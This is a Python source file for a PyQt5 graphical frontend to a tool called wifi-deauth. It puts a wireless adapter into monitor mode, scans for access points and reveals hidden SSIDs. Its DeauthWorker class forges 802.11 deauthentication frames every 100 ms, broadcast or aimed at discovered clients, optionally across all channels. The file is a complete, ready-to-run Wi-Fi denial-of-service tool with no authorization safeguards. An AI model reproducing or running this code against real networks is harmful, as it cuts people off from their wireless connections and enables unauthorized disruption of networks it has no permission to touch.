#!/usr/bin/env python3
"""
PyQt5 graphical frontend for wifi-deauth.

Runs the scan / de-auth logic inside QThread workers (so the UI never blocks)
and reuses the SSID / band helpers from ``utils``. Must be run as root, same as
the CLI, because scapy needs raw sockets to sniff and inject frames.

    sudo python3 -m wifi_deauth.gui
    # or
    sudo python3 wifi_deauth/gui.py
"""

import os
import sys
import time
import threading
import subprocess
from collections import defaultdict, deque

from PyQt5 import QtWidgets, QtCore, QtGui
import pyqtgraph as pg

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *  # noqa: F401,F403  (mirrors the CLI's proven import style)
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Beacon, Dot11ProbeResp, Dot11ProbeReq, \
    Dot11Elt, Dot11Deauth, Dot11QoS, Dot11AssoResp, Dot11ReassoResp, Dot11AssoReq, Dot11ReassoReq

try:
    from .utils.net_definitions import SSID, BandType, frequency_to_channel, BD_MACADDR
except ImportError:
    from utils.net_definitions import SSID, BandType, frequency_to_channel, BD_MACADDR

conf.verb = 0

DEAUTH_INTV = 0.100  # 100 ms between de-auth bursts, same as the CLI


#   --------------------------------------------------------------------------------------------------------------------
#   Interface helpers (the whole app runs as root, so no sudo prefix is needed here)
#   --------------------------------------------------------------------------------------------------------------------

def run_cmd(cmd: str) -> int:
    """Run a shell command, return its exit code (0 == success)."""
    return subprocess.call(cmd, shell=True,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def list_wifi_interfaces():
    """Return [(iface, driver), ...] for every wireless interface on the system."""
    out = []
    net_dir = "/sys/class/net"
    if not os.path.isdir(net_dir):
        return out
    for iface in sorted(os.listdir(net_dir)):
        if os.path.isdir(os.path.join(net_dir, iface, "wireless")):
            drv_link = os.path.join(net_dir, iface, "device", "driver")
            driver = os.path.basename(os.path.realpath(drv_link)) if os.path.exists(drv_link) else "?"
            out.append((iface, driver))
    return out


def interface_mode(iface: str) -> str:
    """Return 'monitor', 'managed' or 'unknown' for the given interface."""
    try:
        info = subprocess.check_output(f"iw dev {iface} info", shell=True,
                                       stderr=subprocess.DEVNULL).decode(errors="ignore")
        for line in info.splitlines():
            line = line.strip()
            if line.startswith("type "):
                return line.split("type ", 1)[1].strip()
    except Exception:
        pass
    return "unknown"


def enable_monitor_mode(iface: str) -> bool:
    for cmd in (f"ip link set {iface} down",
                f"iw {iface} set monitor control",
                f"ip link set {iface} up"):
        if run_cmd(cmd):
            run_cmd(f"ip link set {iface} up")
            return False
    time.sleep(1.5)
    return interface_mode(iface) == "monitor"


def disable_monitor_mode(iface: str) -> bool:
    for cmd in (f"ip link set {iface} down",
                f"iw {iface} set type managed",
                f"ip link set {iface} up"):
        if run_cmd(cmd):
            run_cmd(f"ip link set {iface} up")
            return False
    time.sleep(1.0)
    return interface_mode(iface) == "managed"


def kill_networkmanager() -> bool:
    return run_cmd("systemctl stop NetworkManager") == 0


def set_channel(iface: str, ch: int):
    run_cmd(f"iw dev {iface} set channel {ch}")


def get_supported_channels(iface: str):
    channels = []
    try:
        for line in os.popen(f"iwlist {iface} channel").readlines():
            if "Channel" in line and "Current" not in line:
                try:
                    channels.append(int(line.split("Channel")[1].split(":")[0].strip()))
                except (IndexError, ValueError):
                    continue
    except Exception:
        pass
    return channels or list(range(1, 14))


#   --------------------------------------------------------------------------------------------------------------------
#   Workers
#   --------------------------------------------------------------------------------------------------------------------

class ScanWorker(QtCore.QThread):
    """Hops channels and reports discovered access points."""
    ap_found = QtCore.pyqtSignal(object)      # dict(name, bssid, channel, band, signal)
    channel_changed = QtCore.pyqtSignal(int)
    log = QtCore.pyqtSignal(str)

    def __init__(self, iface, channels, ssid_filter=None, bssid_filter=None, parent=None):
        super().__init__(parent)
        self.iface = iface
        self.channels = channels
        self.ssid_filter = (ssid_filter or "").lower() or None
        self.bssid_filter = (bssid_filter or "").lower() or None
        self._stop = False
        self._aps = {}                    # bssid -> entry dict

    def stop(self):
        self._stop = True

    @staticmethod
    def _extract_ssid(pkt):
        """Return the SSID from the first SSID element (ID 0); '' when hidden/absent."""
        elt = pkt.getlayer(Dot11Elt)
        while elt is not None:
            if elt.ID == 0:
                return elt.info.strip(b"\x00").decode("utf-8", "ignore").strip()
            elt = elt.payload.getlayer(Dot11Elt)
        return ""

    def _cb(self, pkt):
        try:
            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                self._handle_ap(pkt)
            elif pkt.haslayer(Dot11ProbeReq) or pkt.haslayer(Dot11AssoReq) \
                    or pkt.haslayer(Dot11ReassoReq):
                self._handle_reveal(pkt)
        except Exception as exc:
            self.log.emit(f"scan parse error: {exc}")

    def _handle_ap(self, pkt):
        ap_mac = str(pkt.addr3)
        if ap_mac == BD_MACADDR:
            return
        if self.bssid_filter and ap_mac.lower() != self.bssid_filter:
            return
        ssid = self._extract_ssid(pkt)
        hidden = pkt.haslayer(Dot11Beacon) and ssid == ""   # beacon + empty SSID == hidden
        # apply the SSID filter only once the name is actually known
        if self.ssid_filter and ssid and self.ssid_filter not in ssid.lower():
            return
        pkt_ch = frequency_to_channel(pkt[RadioTap].Channel)
        band = "5 GHz" if pkt_ch > 14 else "2.4 GHz"
        try:
            signal = int(pkt.dBm_AntSignal)
        except Exception:
            signal = None

        entry = self._aps.get(ap_mac)
        if entry is None:
            entry = {"name": ssid if ssid else "<hidden>", "bssid": ap_mac,
                     "channel": pkt_ch, "band": band, "signal": signal,
                     "hidden": hidden, "real_ssid": ssid or None}
            self._aps[ap_mac] = entry
            self.ap_found.emit(dict(entry))
            if hidden:
                self.log.emit(f"Hidden network found: {ap_mac} (ch {pkt_ch})")
            return
        # known AP: push an update only when something meaningful changed
        changed = False
        if ssid and entry["real_ssid"] is None:
            entry.update(name=ssid, real_ssid=ssid, hidden=False)
            self.log.emit(f"Revealed SSID for {ap_mac}: {ssid}")
            changed = True
        if pkt_ch and pkt_ch != entry["channel"]:
            entry["channel"] = pkt_ch
            changed = True
        entry["signal"] = signal          # kept fresh, re-emitted lazily
        if changed:
            self.ap_found.emit(dict(entry))

    def _handle_reveal(self, pkt):
        """A client's probe/association request can carry a hidden AP's name."""
        ssid = self._extract_ssid(pkt)
        if not ssid:
            return
        for cand in (str(pkt.addr1), str(pkt.addr3)):
            if cand == BD_MACADDR:
                continue
            entry = self._aps.get(cand)
            if entry is not None and entry["real_ssid"] is None:
                entry.update(name=ssid, real_ssid=ssid, hidden=False)
                self.ap_found.emit(dict(entry))
                self.log.emit(f"Revealed hidden SSID for {cand}: {ssid}")
                break

    def run(self):
        self.log.emit(f"Scan started on {self.iface} ({len(self.channels)} channels)")
        while not self._stop:
            for ch in self.channels:
                if self._stop:
                    break
                set_channel(self.iface, ch)
                self.channel_changed.emit(ch)
                try:
                    sniff(iface=self.iface, prn=self._cb, timeout=1.5,
                          stop_filter=lambda p: self._stop)
                except Exception as exc:
                    self.log.emit(f"sniff error on ch {ch}: {exc}")
                    time.sleep(0.5)
        self.log.emit("Scan stopped")


class DeauthWorker(QtCore.QThread):
    """Sends de-auth frames to a target and sniffs for associated clients."""
    stats = QtCore.pyqtSignal(int, int)       # total_sent, client_count
    client_found = QtCore.pyqtSignal(str)
    log = QtCore.pyqtSignal(str)

    def __init__(self, iface, bssid, channel, custom_clients=None,
                 broadcast=True, all_channels=False, channels=None, parent=None):
        super().__init__(parent)
        self.iface = iface
        self.bssid = bssid
        self.channel = channel
        self.custom_clients = custom_clients or []
        self.broadcast = broadcast
        self.all_channels = all_channels
        self.channels = channels or []
        self._stop = False
        self._clients = list(self.custom_clients)
        self._total_sent = 0
        self._lock = threading.Lock()

    def stop(self):
        self._stop = True

    # -- client discovery -------------------------------------------------
    @staticmethod
    def _confirms_client(pkt):
        return (pkt.haslayer(Dot11AssoResp) and pkt[Dot11AssoResp].status == 0) or \
               (pkt.haslayer(Dot11ReassoResp) and pkt[Dot11ReassoResp].status == 0) or \
               pkt.haslayer(Dot11QoS)

    def _client_cb(self, pkt):
        try:
            if not self._confirms_client(pkt):
                return
            if str(pkt.addr3) != self.bssid:
                return
            c_mac = pkt.addr1
            if c_mac in (BD_MACADDR, self.bssid):
                return
            with self._lock:
                if c_mac not in self._clients:
                    self._clients.append(c_mac)
                    self.client_found.emit(c_mac)
        except Exception:
            pass

    def _client_listener(self):
        # only auto-discover when the user did not pin a specific client list
        if self.custom_clients:
            return
        try:
            sniff(iface=self.iface, prn=self._client_cb,
                  stop_filter=lambda p: self._stop)
        except Exception as exc:
            self.log.emit(f"client listener error: {exc}")

    # -- frame injection --------------------------------------------------
    def _deauth_client(self, client):
        sendp(RadioTap() / Dot11(addr1=client, addr2=self.bssid, addr3=self.bssid) /
              Dot11Deauth(reason=7), iface=self.iface)
        sendp(RadioTap() / Dot11(addr1=self.bssid, addr2=self.bssid, addr3=client) /
              Dot11Deauth(reason=7), iface=self.iface)

    def _deauth_broadcast(self):
        sendp(RadioTap() / Dot11(addr1=BD_MACADDR, addr2=self.bssid, addr3=self.bssid) /
              Dot11Deauth(reason=7), iface=self.iface)

    def run(self):
        self.log.emit(f"De-auth started against {self.bssid}")
        if not self.all_channels:
            set_channel(self.iface, self.channel)
        listener = threading.Thread(target=self._client_listener, daemon=True)
        listener.start()

        ch_idx = 0
        last_emit = time.time()
        while not self._stop:
            try:
                if self.all_channels and self.channels:
                    set_channel(self.iface, self.channels[ch_idx])
                    ch_idx = (ch_idx + 1) % len(self.channels)
                with self._lock:
                    targets = list(self._clients)
                for client in targets:
                    self._deauth_client(client)
                    self._total_sent += 2
                if self.broadcast and not self.custom_clients:
                    self._deauth_broadcast()
                    self._total_sent += 1
                now = time.time()
                if now - last_emit >= 0.5:
                    with self._lock:
                        self.stats.emit(self._total_sent, len(self._clients))
                    last_emit = now
                time.sleep(DEAUTH_INTV)
            except Exception as exc:
                self.log.emit(f"deauth error: {exc}")
                time.sleep(DEAUTH_INTV)
        self.stats.emit(self._total_sent, len(self._clients))
        self.log.emit("De-auth stopped")


#   --------------------------------------------------------------------------------------------------------------------
#   Main window
#   --------------------------------------------------------------------------------------------------------------------

class MainWindow(QtWidgets.QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("wifi-deauth — GUI")
        self.resize(1100, 720)

        self.scan_worker = None
        self.deauth_worker = None
        self.target = None                # dict of the selected AP
        self._row_by_bssid = {}           # bssid -> table row index
        self._start_time = None
        self._pps_history = deque(maxlen=120)
        self._last_sent = 0
        self._last_sent_t = time.time()

        self._build_ui()
        self.refresh_interfaces()

        # 1 Hz timer that drives the live chart / elapsed counter
        self._timer = QtCore.QTimer(self)
        self._timer.timeout.connect(self._tick)
        self._timer.start(1000)

    # ---- UI construction ------------------------------------------------
    def _build_ui(self):
        central = QtWidgets.QWidget()
        self.setCentralWidget(central)
        root = QtWidgets.QVBoxLayout(central)

        root.addWidget(self._build_iface_bar())

        split = QtWidgets.QHBoxLayout()
        split.addWidget(self._build_left_panel(), 3)
        split.addWidget(self._build_right_panel(), 2)
        root.addLayout(split, 1)

        root.addWidget(self._build_log())

        if os.geteuid() != 0:
            self._warn_banner()

    def _build_iface_bar(self):
        box = QtWidgets.QGroupBox("Interface")
        lay = QtWidgets.QHBoxLayout(box)
        self.iface_combo = QtWidgets.QComboBox()
        self.iface_combo.setMinimumWidth(260)
        self.mode_label = QtWidgets.QLabel("mode: —")
        self.mode_label.setStyleSheet("font-weight: bold;")

        btn_refresh = QtWidgets.QPushButton("Refresh")
        btn_refresh.clicked.connect(self.refresh_interfaces)
        self.btn_monitor = QtWidgets.QPushButton("Enable monitor")
        self.btn_monitor.clicked.connect(self.toggle_monitor)
        btn_killnm = QtWidgets.QPushButton("Kill NetworkManager")
        btn_killnm.clicked.connect(self.kill_nm)

        self.iface_combo.currentIndexChanged.connect(self._update_mode_label)

        lay.addWidget(QtWidgets.QLabel("Adapter:"))
        lay.addWidget(self.iface_combo)
        lay.addWidget(self.mode_label)
        lay.addStretch(1)
        lay.addWidget(btn_refresh)
        lay.addWidget(self.btn_monitor)
        lay.addWidget(btn_killnm)
        return box

    def _build_left_panel(self):
        box = QtWidgets.QGroupBox("Scan & targets")
        lay = QtWidgets.QVBoxLayout(box)

        controls = QtWidgets.QHBoxLayout()
        self.ssid_filter = QtWidgets.QLineEdit()
        self.ssid_filter.setPlaceholderText("SSID filter (optional)")
        self.bssid_filter = QtWidgets.QLineEdit()
        self.bssid_filter.setPlaceholderText("BSSID filter (optional)")
        self.btn_scan = QtWidgets.QPushButton("Start scan")
        self.btn_scan.clicked.connect(self.toggle_scan)
        controls.addWidget(self.ssid_filter, 2)
        controls.addWidget(self.bssid_filter, 2)
        controls.addWidget(self.btn_scan, 1)
        lay.addLayout(controls)

        self.ap_table = QtWidgets.QTableWidget(0, 5)
        self.ap_table.setHorizontalHeaderLabels(["SSID", "Channel", "BSSID", "Band", "Signal"])
        self.ap_table.horizontalHeader().setSectionResizeMode(0, QtWidgets.QHeaderView.Stretch)
        self.ap_table.setSelectionBehavior(QtWidgets.QAbstractItemView.SelectRows)
        self.ap_table.setSelectionMode(QtWidgets.QAbstractItemView.SingleSelection)
        self.ap_table.setEditTriggers(QtWidgets.QAbstractItemView.NoEditTriggers)
        self.ap_table.itemSelectionChanged.connect(self._on_target_selected)
        lay.addWidget(self.ap_table, 1)

        # attack controls
        atk = QtWidgets.QGroupBox("Attack")
        atk_lay = QtWidgets.QVBoxLayout(atk)
        self.target_label = QtWidgets.QLabel("Target: — (select an AP)")
        self.target_label.setStyleSheet("font-weight: bold;")
        atk_lay.addWidget(self.target_label)

        opts = QtWidgets.QHBoxLayout()
        self.chk_broadcast = QtWidgets.QCheckBox("Broadcast")
        self.chk_broadcast.setChecked(True)
        self.chk_allch = QtWidgets.QCheckBox("All channels")
        self.clients_edit = QtWidgets.QLineEdit()
        self.clients_edit.setPlaceholderText("custom client MACs, comma-separated (optional)")
        opts.addWidget(self.chk_broadcast)
        opts.addWidget(self.chk_allch)
        opts.addWidget(self.clients_edit, 1)
        atk_lay.addLayout(opts)

        self.btn_deauth = QtWidgets.QPushButton("Start de-auth")
        self.btn_deauth.setEnabled(False)
        self.btn_deauth.setStyleSheet("padding: 8px; font-weight: bold;")
        self.btn_deauth.clicked.connect(self.toggle_deauth)
        atk_lay.addWidget(self.btn_deauth)
        lay.addWidget(atk)
        return box

    def _build_right_panel(self):
        box = QtWidgets.QGroupBox("Live stats")
        lay = QtWidgets.QVBoxLayout(box)

        grid = QtWidgets.QGridLayout()
        self.lbl_sent = self._stat_label("0")
        self.lbl_pps = self._stat_label("0")
        self.lbl_clients = self._stat_label("0")
        self.lbl_channel = self._stat_label("—")
        self.lbl_elapsed = self._stat_label("0s")
        grid.addWidget(QtWidgets.QLabel("Frames sent"), 0, 0)
        grid.addWidget(self.lbl_sent, 0, 1)
        grid.addWidget(QtWidgets.QLabel("Frames/sec"), 1, 0)
        grid.addWidget(self.lbl_pps, 1, 1)
        grid.addWidget(QtWidgets.QLabel("Clients"), 2, 0)
        grid.addWidget(self.lbl_clients, 2, 1)
        grid.addWidget(QtWidgets.QLabel("Channel"), 3, 0)
        grid.addWidget(self.lbl_channel, 3, 1)
        grid.addWidget(QtWidgets.QLabel("Elapsed"), 4, 0)
        grid.addWidget(self.lbl_elapsed, 4, 1)
        lay.addLayout(grid)

        pg.setConfigOptions(antialias=True)
        self.plot = pg.PlotWidget()
        self.plot.setBackground("#1e1e1e")
        self.plot.setTitle("De-auth frames per second")
        self.plot.setLabel("left", "frames/s")
        self.plot.setLabel("bottom", "seconds ago")
        self.plot.showGrid(x=True, y=True, alpha=0.3)
        self.curve = self.plot.plot(pen=pg.mkPen("#ff5555", width=2))
        lay.addWidget(self.plot, 1)
        return box

    def _stat_label(self, text):
        lbl = QtWidgets.QLabel(text)
        lbl.setStyleSheet("font-size: 20px; font-weight: bold; color: #4ec9b0;")
        return lbl

    def _build_log(self):
        box = QtWidgets.QGroupBox("Log")
        lay = QtWidgets.QVBoxLayout(box)
        self.log_view = QtWidgets.QPlainTextEdit()
        self.log_view.setReadOnly(True)
        self.log_view.setMaximumBlockCount(500)
        self.log_view.setFixedHeight(130)
        lay.addWidget(self.log_view)
        return box

    def _warn_banner(self):
        self.log_msg("WARNING: not running as root — scanning and injection will fail. "
                     "Relaunch with: sudo python3 -m wifi_deauth.gui")

    # ---- helpers --------------------------------------------------------
    def current_iface(self):
        data = self.iface_combo.currentData()
        return data if data else None

    def log_msg(self, msg):
        ts = time.strftime("%H:%M:%S")
        self.log_view.appendPlainText(f"[{ts}] {msg}")

    def refresh_interfaces(self):
        self.iface_combo.blockSignals(True)
        self.iface_combo.clear()
        for iface, driver in list_wifi_interfaces():
            self.iface_combo.addItem(f"{iface}  ({driver})", iface)
        self.iface_combo.blockSignals(False)
        self._update_mode_label()
        self.log_msg("Interfaces refreshed")

    def _update_mode_label(self):
        iface = self.current_iface()
        if not iface:
            self.mode_label.setText("mode: —")
            return
        mode = interface_mode(iface)
        color = "#4ec9b0" if mode == "monitor" else "#d7ba7d"
        self.mode_label.setText(f"mode: {mode}")
        self.mode_label.setStyleSheet(f"font-weight: bold; color: {color};")
        self.btn_monitor.setText("Disable monitor" if mode == "monitor" else "Enable monitor")

    # ---- interface actions ---------------------------------------------
    def toggle_monitor(self):
        iface = self.current_iface()
        if not iface:
            return
        if interface_mode(iface) == "monitor":
            self.log_msg(f"Setting {iface} back to managed...")
            ok = disable_monitor_mode(iface)
        else:
            self.log_msg(f"Enabling monitor mode on {iface}...")
            ok = enable_monitor_mode(iface)
        self.log_msg("OK" if ok else "FAILED (need root? interface busy?)")
        self._update_mode_label()

    def kill_nm(self):
        self.log_msg("Stopping NetworkManager...")
        self.log_msg("OK" if kill_networkmanager() else "FAILED (need root?)")

    # ---- scan -----------------------------------------------------------
    def toggle_scan(self):
        if self.scan_worker and self.scan_worker.isRunning():
            self.scan_worker.stop()
            self.scan_worker.wait(3000)
            self.scan_worker = None
            self.btn_scan.setText("Start scan")
            return

        iface = self.current_iface()
        if not iface:
            self.log_msg("No interface selected")
            return
        if interface_mode(iface) != "monitor":
            QtWidgets.QMessageBox.warning(self, "Monitor mode required",
                                          f"{iface} is not in monitor mode. Enable it first.")
            return
        self.ap_table.setRowCount(0)
        self._row_by_bssid.clear()
        channels = get_supported_channels(iface)
        self.scan_worker = ScanWorker(iface, channels,
                                      self.ssid_filter.text().strip(),
                                      self.bssid_filter.text().strip())
        self.scan_worker.ap_found.connect(self._upsert_ap)
        self.scan_worker.channel_changed.connect(lambda c: self.lbl_channel.setText(str(c)))
        self.scan_worker.log.connect(self.log_msg)
        self.scan_worker.start()
        self.btn_scan.setText("Stop scan")

    def _upsert_ap(self, ap):
        """Insert a new AP row, or update the existing one in place (keyed by BSSID)."""
        bssid = ap["bssid"]
        signal = f"{ap['signal']} dBm" if ap.get("signal") is not None else "—"
        values = [ap["name"], str(ap["channel"]), bssid, ap["band"], signal]
        row = self._row_by_bssid.get(bssid)
        if row is None:
            row = self.ap_table.rowCount()
            self.ap_table.insertRow(row)
            self._row_by_bssid[bssid] = row
        hidden = ap.get("hidden", False)
        for col, val in enumerate(values):
            item = self.ap_table.item(row, col)
            if item is None:
                item = QtWidgets.QTableWidgetItem()
                self.ap_table.setItem(row, col, item)
            item.setText(val)
            item.setData(QtCore.Qt.UserRole, ap)
            font = item.font()
            font.setItalic(hidden)        # hidden networks shown in italics
            item.setFont(font)
        # if the revealed/updated AP is the current target, refresh its label
        if self.target and self.target.get("bssid") == bssid:
            self.target = ap
            self.target_label.setText(f"Target: {ap['name']}  [{bssid}]  ch {ap['channel']}")

    def _on_target_selected(self):
        items = self.ap_table.selectedItems()
        if not items:
            return
        ap = items[0].data(QtCore.Qt.UserRole)
        self.target = ap
        self.target_label.setText(f"Target: {ap['name']}  [{ap['bssid']}]  ch {ap['channel']}")
        self.btn_deauth.setEnabled(True)

    # ---- deauth ---------------------------------------------------------
    def toggle_deauth(self):
        if self.deauth_worker and self.deauth_worker.isRunning():
            self.deauth_worker.stop()
            self.deauth_worker.wait(3000)
            self.deauth_worker = None
            self.btn_deauth.setText("Start de-auth")
            self.btn_scan.setEnabled(True)
            return

        if not self.target:
            self.log_msg("No target selected")
            return
        iface = self.current_iface()
        if interface_mode(iface) != "monitor":
            QtWidgets.QMessageBox.warning(self, "Monitor mode required",
                                          f"{iface} is not in monitor mode.")
            return

        # a running channel-hopping scan would fight the deauth for the radio
        if self.scan_worker and self.scan_worker.isRunning():
            self.toggle_scan()

        clients = [c.strip() for c in self.clients_edit.text().split(",") if c.strip()]
        channels = get_supported_channels(iface) if self.chk_allch.isChecked() else None
        self.deauth_worker = DeauthWorker(
            iface=iface,
            bssid=self.target["bssid"],
            channel=self.target["channel"],
            custom_clients=clients,
            broadcast=self.chk_broadcast.isChecked(),
            all_channels=self.chk_allch.isChecked(),
            channels=channels,
        )
        self.deauth_worker.stats.connect(self._on_stats)
        self.deauth_worker.client_found.connect(lambda m: self.log_msg(f"New client: {m}"))
        self.deauth_worker.log.connect(self.log_msg)
        self._start_time = time.time()
        self._pps_history.clear()
        self._last_sent = 0
        self._last_sent_t = time.time()
        self.deauth_worker.start()
        self.btn_deauth.setText("Stop de-auth")
        self.btn_scan.setEnabled(False)

    def _on_stats(self, total_sent, clients):
        self.lbl_sent.setText(str(total_sent))
        self.lbl_clients.setText(str(clients))

    def _tick(self):
        if self.deauth_worker and self.deauth_worker.isRunning():
            total = int(self.lbl_sent.text() or "0")
            now = time.time()
            dt = now - self._last_sent_t
            pps = (total - self._last_sent) / dt if dt > 0 else 0
            self._last_sent, self._last_sent_t = total, now
            self._pps_history.append(pps)
            self.lbl_pps.setText(f"{pps:.0f}")
            xs = list(range(-len(self._pps_history) + 1, 1))
            self.curve.setData(xs, list(self._pps_history))
            self.lbl_elapsed.setText(f"{int(now - self._start_time)}s")

    def closeEvent(self, event):
        for w in (self.scan_worker, self.deauth_worker):
            if w and w.isRunning():
                w.stop()
                w.wait(2000)
        event.accept()


def main():
    if "linux" not in sys.platform:
        print("Only linux is supported.", file=sys.stderr)
        sys.exit(1)
    app = QtWidgets.QApplication(sys.argv)
    app.setStyle("Fusion")
    win = MainWindow()
    win.show()
    if os.geteuid() != 0:
        QtWidgets.QMessageBox.warning(win, "Root required",
                                      "wifi-deauth needs root to sniff and inject frames.\n"
                                      "Relaunch with:\n\n    sudo python3 -m wifi_deauth.gui")
    sys.exit(app.exec_())


if __name__ == "__main__":
    main()
